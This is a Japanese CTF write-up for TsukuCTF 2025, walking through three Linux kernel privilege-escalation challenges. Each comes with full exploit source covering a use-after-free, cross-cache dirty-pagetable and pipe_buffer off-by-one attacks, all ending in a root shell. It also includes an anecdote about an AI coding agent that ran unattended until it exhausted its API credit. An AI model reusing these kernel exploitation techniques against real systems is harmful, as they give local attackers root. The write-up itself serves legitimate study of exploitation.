---
layout: page
title: TsukuCTF 2025
parent: CTF Writeups
nav_order: 9
---

TsukuCTF 2025 に参加してきました。一位らしく、嬉しいです。

さて、私が解いた問題は

- easy_kernel(pwn)
- xcache(pwn)
- new_era(pwn)
- Casca(osint)
- curve(osint)
- destroyed(osint)
- rider(osint)
- schnee(osint)
- power(osint)
- hidden_wpath(osint)

です。OSINTの大部分は ChatGPT o3 がほぼすべて解いたので解説しませんし、できません。作問者の皆さん、ごめんなさい。

この記事では、Pwn問題の解説をしていきます。が、気力があまりないのでざっくり解説になります。記事を見ている皆さん、ごめんなさい。

# easy_kernel

こんなカーネルモジュールが差し込まれる。

```c
#define CMD_ALLOC   0xf000
#define CMD_WRITE   0xf001
#define CMD_FREE    0xf002

#define OBJ_SIZE    0x20

typedef struct {
    size_t size;
    char *data;
} request_t;

struct obj {
    char buf[OBJ_SIZE];
};

static struct obj *obj = NULL;
static DEFINE_MUTEX(module_lock);

static long obj_alloc(void) {
    if (obj != NULL) {
        return -1;
    }
    obj = kzalloc(sizeof(struct obj), GFP_KERNEL);
    if (obj == NULL) {
        return -1;
    }
    return 0;
}

static long obj_write(char *data, size_t size) {
    if (obj == NULL || size > OBJ_SIZE) {
        return -1;
    }
    if (copy_from_user(obj->buf, data, size) != 0) {
        return -1;
    }
    return 0;
}

static long obj_free(void) {
    kfree(obj);
    return 0;
}

static long module_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    request_t req;
    long ret;
    if (copy_from_user(&req, (void *)arg, sizeof(req)) != 0) {
        return -1;
    }
    mutex_lock(&module_lock);
    switch(cmd) {
        case CMD_ALLOC:
            ret = obj_alloc();
            break;
        case CMD_WRITE:
            ret = obj_write(req.data, req.size);
            break;
        case CMD_FREE:
            ret = obj_free();
            break;
        default:
            ret = -1;
            break;
    }
    mutex_unlock(&module_lock);
    return ret;
}
```

自明なUAFがある。`0x20`サイズなので、[`seq_operations`が使えそう](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#seq_operations)。
`alloc` → `free` → `open("/proc/self/stat")` → `write` → `read` で RIPが取れる。

さて、起動スクリプトを見るとなんと `nokaslr nopti` の文字が！
ユーザ空間で適当な関数を作成し、`commit_cred(init_cred)`をカーネルから呼び出せばrootが取れる。

```c
#define CMD_ALLOC 0xf000
#define CMD_WRITE 0xf001
#define CMD_FREE 0xf002

typedef struct {
  size_t size;
  char *data;
} request_t;

int open_vuln(void);
void close_vuln(void);
int obj_alloc(void);
int obj_write(const char *buf, size_t len);
int obj_free(void);

static int dev_fd = -1;

void exploit() {
  // call commit_cred(INIT_CRED)
#define COMMIT_CRED 0xffffffff812a1050
#define INIT_CRED 0xffffffff81e3bfa0
#define DO_SYS_FORK 0xffffffff81272ce0
#define MSLEEP 0xffffffff812fd7d0

  typedef void (*commit_creds_t)(void *);
  commit_creds_t commit_creds = (commit_creds_t)COMMIT_CRED;
  commit_creds((void *)INIT_CRED);

  typedef void (*do_sys_fork_t)(void);
  typedef void (*msleep_t)(unsigned long);

  do_sys_fork_t do_sys_fork = (do_sys_fork_t)DO_SYS_FORK;
  msleep_t msleep = (msleep_t)MSLEEP;

  do_sys_fork();
  msleep(0x100000);
}

int main() {
  fprintf(stderr, "Starting exploit...\n");

  open_vuln();
  obj_alloc();
  obj_write("Hello, world!", 13);
  obj_free();

  int fd = open("/proc/self/stat", O_RDONLY);

  void *exploit_ptr = (void *)exploit;
  obj_write((char *)&exploit_ptr, 8);

  char buf[0x100];
  read(fd, buf, sizeof(buf)); // trigger `start`

  if (getuid() == 0) {
    printf("you got real world! have a fun~\n");
    system("id");
    system("/bin/sh");
  }
}

```

ret2usrに使っているのはteleforkと呼ばれる手法で、システムコールをハンドルしている時に`do_sys_fork`を呼び出すことで`fork`が呼び出されたことにしてしまい、これによってユーザ空間に戻る処理を横着することができます。片割れはカーネルに居座ってしまうので`msleep`で黙らせるのを忘れずに。

![easy_kernel Exploited](https://raw.githubusercontent.com/Iwancof/about-me/main/writeups/easy_kernel_solve.png)

# xcache

こんなカーネルモジュールが差し込まれる。

```c
#define CMD_ALLOC   0xf000
#define CMD_WRITE   0xf001
#define CMD_FREE    0xf002

#define OBJ_MAX     0x200
#define OBJ_SIZE    0x200

typedef struct {
    int id;
    size_t size;
    char *data;
} request_t;

struct obj {
    char buf[OBJ_SIZE];
};

static struct obj *objs[OBJ_MAX];
static struct kmem_cache *obj_cachep;
static DEFINE_MUTEX(module_lock);

static long obj_alloc(int id) {
    if (objs[id] != NULL) {
        return -1;
    }
    objs[id] = kmem_cache_zalloc(obj_cachep, GFP_KERNEL);
    if (objs[id] == NULL) {
        return -1;
    }
    return 0;
}

static long obj_write(int id, char *data, size_t size) {
    if (objs[id] == NULL || size > OBJ_SIZE) {
        return -1;
    }
    if (copy_from_user(objs[id]->buf, data, size) != 0) {
        return -1;
    }
    return 0;
}

static long obj_free(int id) {
    kmem_cache_free(obj_cachep, objs[id]);
    return 0;
}

static long module_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    request_t req;
    long ret;
    if (copy_from_user(&req, (void *)arg, sizeof(req)) != 0) {
        return -1;
    }
    if (req.id < 0 || req.id > OBJ_MAX - 1) {
        return -1;
    }
    mutex_lock(&module_lock);
    switch(cmd) {
        case CMD_ALLOC:
            ret = obj_alloc(req.id);
            break;
        case CMD_WRITE:
            ret = obj_write(req.id, req.data, req.size);
            break;
        case CMD_FREE:
            ret = obj_free(req.id);
            break;
        default:
            ret = -1;
            break;
    }
    mutex_unlock(&module_lock);
    return ret;
}
```


同じように自明なUAFがあるが、`kmem_cache`を使っているので何もしないと他のオブジェクトと重ならない。
そこで、めっちゃ取ってめっちゃ開放することで、不必要になった`slub`がbuddyに回収されることを利用する（本当は**めっちゃ**取る必要はなくて、`nr_partial`といった値を参考にすればスマートに解けるが、面倒なのでしない）。

不要になり、buddyに回収された`slub`は、その`page`がfreeされ再利用される。UAFを用いることで再利用先のデータを改ざんできる。重要なのは、一度buddyを介するという点で、pageとしてfreeされるので、`kmem_cache`等の制約を受けない。

今回は、dirty pagetableと呼ばれる手法を使うことにした。これはページングに使われる構造体であるPTEを再利用先に設定し、そこに好きなアドレスを書き込むことで、任意の物理アドレスへの書き込みを実現する手法である。PTE構造体**自体**が一つのPageとして確保されるため、kmalloc等で取られるオブジェクトに比べ、不確実性が少ないという利点がある。

さて、物理アドレスへの無制限のアクセスを手に入れたが、物理アドレスもRANDOMIZEされている。が、これは高々512通りであり、PTEのエントリも512個設定できるため、全部試して目的のアドレスを探せば良い。これでカーネルを含む全メモリ空間に対する無制限の読み書きプリミティブが手に入った。

書き換え先には`setuid`の権限チェックを行う機械語を選んだ。権限チェックするif文の機械語を変更してやると、すべての`setuid(0)`が素通りされる。

```c
#define KPWN_LOGGING
#define KPWN_COLOR
#include <kpwn.hpp>

#define DEVICE_PATH "/dev/vuln"

#define CMD_ALLOC 0xf000
#define CMD_WRITE 0xf001
#define CMD_FREE 0xf002

#define OBJ_MAX 0x200
#define OBJ_SIZE 0x200

/* Mirror of kernel-space request_t */
typedef struct {
  int id;
  size_t size;
  void *data;
} request_t;

/* Function prototypes */
void open_device(void);
int obj_alloc(int id);
int obj_write(int id, void *buf, size_t size);
int obj_free(int id);

int fd;

int main() {
  kpwn::misc::process_assign_to_core(0);
  uint64_t *buffer = (uint64_t *)malloc(0x1000);

  // allcoate pte entry at 0
  kpwn::memory::mmap(0x1, 0x0, 0x0, 0x0, 0x0, {.touch = 1});

  open_device();

  for (int i = 0; i < OBJ_MAX; i++)
    obj_alloc(i); // めっちゃ取って

  for (int i = OBJ_MAX - 1; i >= 0; i--)
    obj_free(i); // めっちゃ開放

  // ここで、一部のslubがbuddyに返され、再利用可能なpageになる。

  // 新しいPTEを確保する
  kpwn::memory::mmap(0x1, 0x0, 0x80, 0x0, 0x0, {.touch = 1});

  size_t dest_phy = 0xffffffff8128ad99; // setuid内の、if文の条件分岐部分を指している。

  int phy_aslr_base = 0;
  for (int i = 0; i < OBJ_MAX; i++) {
    for (int entry_idx = phy_aslr_base; entry_idx < phy_aslr_base + 64;
         entry_idx++)
      buffer[entry_idx] = kpwn::kernel::dest_to_pte_entry(dest_phy, entry_idx);

    // entry_idxをずらしながら、ありえる物理アドレスをPTEに書き込みまくっていく。

    obj_write(i, buffer, 0x200); // 本当は0x1000書き込みたいが、制約上0x200までしか書き込めない。ただ現実的にはこれでexploitできる。
  }

  for (int check_idx = phy_aslr_base; check_idx < phy_aslr_base + 64;
       check_idx++) {
    char *check_addr = (char *)kpwn::kernel::pti_to_virt(
        0x1, 0x0, 0x80, check_idx, dest_phy & 0xfff);

    // 実際に改ざんされたページテーブルを介してメモリアクセスを行ってみる。

    if (check_addr[0] == (char)0x84 && check_addr[1] == (char)0xc0) {
      check_addr[0] = 0x84;
      check_addr[1] = 0xff;
      kpwn::info("check_addr = %p", check_addr);
        
      // 目的の書き込み先を見つけた。
      // test al, al == 84c0
      // test bh, bh == 84ff
      // 下の命令に書き換えることで権限チェックを壊す。

      goto found;
    }
  }

  kpwn::fatal("setuid function was not found. try to change phy_aslr_base");
found:

  setuid(0); // 権限チェックが壊れているので、これでuidが0にセットされる。

  system("/bin/sh");
}
```

![xcache Exploited](https://raw.githubusercontent.com/Iwancof/about-me/main/writeups/xcache_solve.png)

# new_era

こんなカーネルモジュールが差し込まれる。

```c
#define CMD_ALLOC   0xf000
#define CMD_WRITE   0xf001

#define OBJ_SIZE    0x400

typedef struct {
    size_t size;
    char *data;
} request_t;

struct obj {
    char buf[OBJ_SIZE];
};

static struct obj *obj = NULL;
static DEFINE_MUTEX(module_lock);

static long obj_alloc(void) {
    if (obj != NULL) {
        return -1;
    }
    obj = kzalloc(sizeof(struct obj), GFP_KERNEL);
    if (obj == NULL) {
        return -1;
    }
    return 0;
}

static long obj_write(char *data, size_t size) {
    if (obj == NULL || size > OBJ_SIZE) {
        return -1;
    }
    if (copy_from_user(obj->buf, data, size) != 0) {
        return -1;
    }
    obj->buf[size] = '\0';
    return 0;
}

static long module_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    request_t req;
    long ret;
    if (copy_from_user(&req, (void *)arg, sizeof(req)) != 0) {
        return -1;
    }
    mutex_lock(&module_lock);
    switch(cmd) {
        case CMD_ALLOC:
            ret = obj_alloc();
            break;
        case CMD_WRITE:
            ret = obj_write(req.data, req.size);
            break;
        default:
            ret = -1;
            break;
    }
    mutex_unlock(&module_lock);
    return ret;
}
```

書き込みに自明な off-by-one がある。これ、この間のcodegatectf2025で似たような問題が出題されてたな。
さて、一番下のバイトを改ざんできると言ったら`struct pipe_buffer`の出番である。こいつは構造体の先頭に`struct page`へのポインタが格納されており改ざん対象として優秀であるだけでなく、`pipe`の確保や開放・書き込みといった操作をユーザから自由に行うことができる。おまけに、どの`slub`に`struct pipe_buffer`を配置するかもユーザが選べるというのだから、もはやkernel exploitで改ざんされるためだけに生を受けたと言っても過言ではない。

構造体確保の流れを説明するための、pipeの内部バッファがどのように管理されているかを軽く説明する。

pipeに対する`write`は、対応するpipeの`read`から読み出すことができる。読み出すまでの間、データはカーネルのバッファに保管される。
データは`0x1000`バイトずつに区切られ、区切られた`0x1000`バイトのデータはそれぞれ対応する`struct pipe_buffer`が面倒を見る。

```c
struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};
```

つまり、`0x2000`バイトの書き込みがあった時、`struct pipe_buffer`が二つ確保され、それぞれが`0x1000`バイトずつ担当するということになる。

`struct pipe_buffer`自体は配列として確保され、ring bufferとして扱われる。あまり重要では無いが、`struct pipe_buffer`を持っている`struct pipe_inode_info`の定義も以下に示す。

```c
struct pipe_inode_info {
	struct mutex mutex;
	wait_queue_head_t rd_wait, wr_wait;
	unsigned int head;
	unsigned int tail;
	unsigned int max_usage;
	unsigned int ring_size;
#ifdef CONFIG_WATCH_QUEUE
	bool note_loss;
#endif
	unsigned int nr_accounted;
	unsigned int readers;
	unsigned int writers;
	unsigned int files;
	unsigned int r_counter;
	unsigned int w_counter;
	bool poll_usage;
	struct page *tmp_page;
	struct fasync_struct *fasync_readers;
	struct fasync_struct *fasync_writers;
	struct pipe_buffer *bufs; // ここ！
	struct user_struct *user;
#ifdef CONFIG_WATCH_QUEUE
	struct watch_queue *watch_queue;
#endif
};
```

さて、パイプのバッファサイズは`fcntl`関数で設定することができる。例えば、`fcntl(pipes[1], F_SETPIPE_SZ, 0x1000 * 16)`とすると、パイプのバッファとして`0x1000 * 16`を確保しようとする。つまり `struct pipe_buffer` が16個必要になり、kmallocで確保される。
`struct pipe_buffer`のサイズは`0x28`なので、`16 * 0x28 = 0x280`となり、繰り上げられ`0x400`で`kmalloc`が走る。これは`OBJ_SIZE`と一致するので、アロケーションを工夫すれば`obj`と`bufs`を隣接させることができる。

問題の脆弱性に話を戻そう。OOBによって、一番先頭に立っていた`struct pipe_buffer`の`page`メンバが壊すことができ、これによってパイプの構造体のバッファの位置をずらすことができるようになった。改ざん対象である `struct page` はページへの直接的なアドレスを持っているわけではなく、あくまでもページを管理するための構造体であることに注意。こいつのサイズは`0x40`である。

ある`struct pipe_buffer`がページを掴んでいて、そのページへのアドレスが`0xffffffff80dead80`だとする。ここでOOBによって下位バイトが00になると、`0xffffffff80dead00`となり、別のpageを指すようになる。
この改ざん先がたまたま別の`struct pipe_buffer`を掴んでいたページだとすると、同一のページをバッファとする二つのパイプが生まれてしまう。

更に、この状態で片方の`pipe`を開放すると、掴んでいたページがそのまま返却され、再利用待ちになる。これを前と同じようにPTEとして再利用した場合、もう片割れの`pipe`への読み書きはPTEへの読み書きとなる。
これで、前回と同じように任意の物理アドレスへのアクセスが可能になった。後は`setuid`を書き換えて`root`を取るだけである。

```c
#define KPWN_LOGGING
#define KPWN_COLOR
#include <kpwn.hpp>

#define DEVICE_PATH "/dev/vuln"

#define CMD_ALLOC 0xf000
#define CMD_WRITE 0xf001

#define OBJ_SIZE 0x400

#define NUM_PIPES 8

/* Mirror of kernel-space request_t */
typedef struct {
  size_t size;
  char *data;
} request_t;

char FILL_BUF[OBJ_SIZE];

/* Function prototypes */
void open_device(void);
int obj_alloc();
int obj_write(char *buf, size_t size);

void alloc_pipe(int pipes[NUM_PIPES][2]);
void resize_pipe(int pipes[NUM_PIPES][2]);

int fd;

int main() {
  kpwn::misc::init();
  kpwn::misc::process_assign_to_core(0); // pinはしておいて損はない。いくらしたって構わない。

  // allcoate pdu, pte...
  kpwn::memory::mmap(0x1, 0x0, 0x0, 0x0, 0x0, {.touch = 1});
  // mmapするとPTE以外にもPMDやPUDが確保されてしまう。
  // 最初にPMD, PUD, PTEを確保することで、PTEのインデックスをずらした際、PTEテーブルだけを狙って確保できる。
  // また、実際にアクセスがあるまで諸々は確保されないので、何かしらのアクセスをしておく必要がある。{ .touch = 1 }

  kpwn::log("allocating pipes...");

  int pipes_a[NUM_PIPES][2];
  int pipes_b[NUM_PIPES][2];

  alloc_pipe(pipes_a);
  alloc_pipe(pipes_b);

  open_device();

  // 攻撃対象のオブジェクトを挟み込むように struct pipe_buffer 配列を確保。
  resize_pipe(pipes_a);
  obj_alloc();
  resize_pipe(pipes_b);

  int pipes[NUM_PIPES * 2][2];
  for (int i = 0; i < NUM_PIPES; i++) {
    pipes[i][0] = pipes_a[i][0];
    pipes[i][1] = pipes_a[i][1];
  }
  for (int i = 0; i < NUM_PIPES; i++) {
    pipes[i + NUM_PIPES][0] = pipes_b[i][0];
    pipes[i + NUM_PIPES][1] = pipes_b[i][1];
  }

  kpwn::info("write id to pipes");

  // 予め、pipes[i]にiという値を入れておく。当然、対応するpipeからreadを行うとiが帰ってくるはずである。
  char buf[0x10];
  for (int i = 0; i < NUM_PIPES * 2; i++) {
    memset(buf, i, sizeof(buf));
    write(pipes[i][1], buf, sizeof(buf));
  }

  // 脆弱性を発火させ、その場に居た struct pipe_buffer が犠牲になる。
  kpwn::info("creating broken pipe");
  obj_write(FILL_BUF, sizeof(FILL_BUF));

  int breaker = -1;
  int victim = -1;
  for (int i = 0; i < NUM_PIPES * 2; i++) {
    auto [n, r] = kpwn::utils::read(pipes[i][0], 1);
    if (n == 0)
      kpwn::fatal("read error");

    // 先程、pipes[i] に i を書き込んだため、そこからreadを行えば i が帰ってくるはず。
    if (*r != i) {
      // しかし、脆弱性によってpageがずれると、犠牲になったpipeは別のバッファを指すことになる。それを検知する。
      // そこに書き込まれている値が、本来そのバッファを使っていたpipeのインデックスであるため、それを記録。

      breaker = i;
      victim = *r;
      goto found;
    }
  }

  kpwn::fatal("no broken pipe");

found:
  kpwn::success("found broken pipe. breaker: %d, victim: %d", breaker, victim);

  // breaker 側からpageを破棄する。
  // breaker -> page(FREED) <- victim
  close(pipes[breaker][0]);
  close(pipes[breaker][1]);

  // victim は開放されたpageに対する読み書きを行うことができる。

  kpwn::memory::mmap(0x1, 0x0, 0x1, 0x0, 0x0, {.touch = 1});
  // 新しく PTE を確保する。運が良ければ victim が掴んでいるpageと重なる。

  // victimからデータを読み出し、それを表示してみる。PTEの内容が出てくることが期待される。
  auto [num_read, read_buf] = kpwn::utils::read(pipes[victim][0], 100);

  kpwn::info("-- pte leak --");
  kpwn::misc::hexdump(read_buf, num_read);

  kpwn::info("pte entry: %lx", kpwn::kernel::pte_to_phy(*(int64_t *)read_buf));
  // 表示はしなくても良いが、readはしておかないと変なところからPTEに書き込みが入ってしまうため、必ずバッファを空にすることを忘れずに。

  size_t dest_phy = 0xc87c2; // setuid の if文の部分。xcacheと同じ。
  for (int entry_idx = 0; entry_idx < 256; entry_idx++) {
    uint64_t pte_entry = kpwn::kernel::dest_to_pte_entry(dest_phy, entry_idx);
    write(pipes[victim][1], &pte_entry, sizeof(pte_entry));
    // パイプに大量のPTEエントリを書き込んでいく。xcacheと同じ。
  }

  for (int check_idx = 0; check_idx < 256; check_idx++) {
    char *check_addr = (char *)kpwn::kernel::pti_to_virt(
        0x1, 0x0, 0x1, check_idx, dest_phy & 0xfff);

    if (check_addr[0] == (char)0x84 && check_addr[1] == (char)0xc0) {
      check_addr[0] = 0x84;
      check_addr[1] = 0xff;
      // これも同じ
      kpwn::info("setuid = %p", check_addr);
      break;
    }
  }

  setuid(0);

  if (getuid() != 0) {
    kpwn::fatal("setuid failed");
  }

  kpwn::success("you got real world");

  system("/bin/sh");
}
```

![new era Exploited](https://raw.githubusercontent.com/Iwancof/about-me/main/writeups/new_era_solve.png)


# 補足

記事内で使っている関数や定数はここ。

[kpwn.hpp](https://github.com/Iwancof/kpwn)



また、exploitではC++を使っているが、musl-gccでこれを使うための面倒な工夫を沢山しているので、素直にCを使うべきではある。バイナリサイズを小さくするためのETLを使ったり、工夫して静的ビルドにしたりしているが、おすすめはしない。

# おまけ

OSINTは半分以上AIで倒した。

![OSINT SOLVE](https://raw.githubusercontent.com/Iwancof/about-me/main/writeups/osint_solve.png)

唯一、`rider`というインドネシア問(?)だけは解いてくれなかったため、写り込んでいる店の情報を(AIが)推測し Google Map API を使って Street View のURLを全列挙した。
異国のようわからんフライドチキン店を血眼になって探す姿は誰にも見られたくないと思った。

`hidden_wpath`はChatGPTで聞くだけでは解けない問題だったため、問題のURLとチームメイトが解析した結果を雑にまとめClineに投げて寝たのだが、これがまずかった。

起きて目に入ったのは、〇〇解析結果という名前で作られた大量のmarkdownファイル群と、API Creditを使い果たし死んでいるClaudeの姿だった。ただ仕事だけは完遂していたようで、謎のログファイル内に記録されているflagへのリンクがmarkdownの随所に記述されていた。見つけたなら止まってくれ...。アクセスするとちゃんとフラグが手に入った。なんかイソップ寓話にありそうな話だな。

# 感想

Pwnが全部kernel問題でスゲーって思いました。難易度的にも、慣れてる人はさくっと解けるレベルでメッチャクチャ面白かったです！
特に、`new_era`は少し前のcodegatectf2025の`pew`として出題されていた問題設定の応用っぽく、ちょうどよい復習になりました。

この場を借りて、チームメンバーの皆さん、運営の皆さん、問題作成者の皆さん感謝します。楽しい大会をありがとうございました！

![SCOREBOARD](https://raw.githubusercontent.com/Iwancof/about-me/main/writeups/tsuku_scoreboard.png)
